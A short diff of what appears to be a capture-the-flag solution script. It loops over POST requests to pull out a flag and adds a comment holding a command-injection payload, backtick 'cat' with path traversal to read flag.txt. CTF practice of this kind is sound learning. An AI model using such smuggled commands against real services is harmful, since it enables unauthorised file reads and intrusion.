@@ -43,3 +43,5 @@ for i in range(0,50,10):
     r = s.post(url, headers=headers, data=data)
     flag+=r.text
     print("\r"+flag, end="", flush=True)
+
+# cowsay "`cat ../../../../flag.txt`"
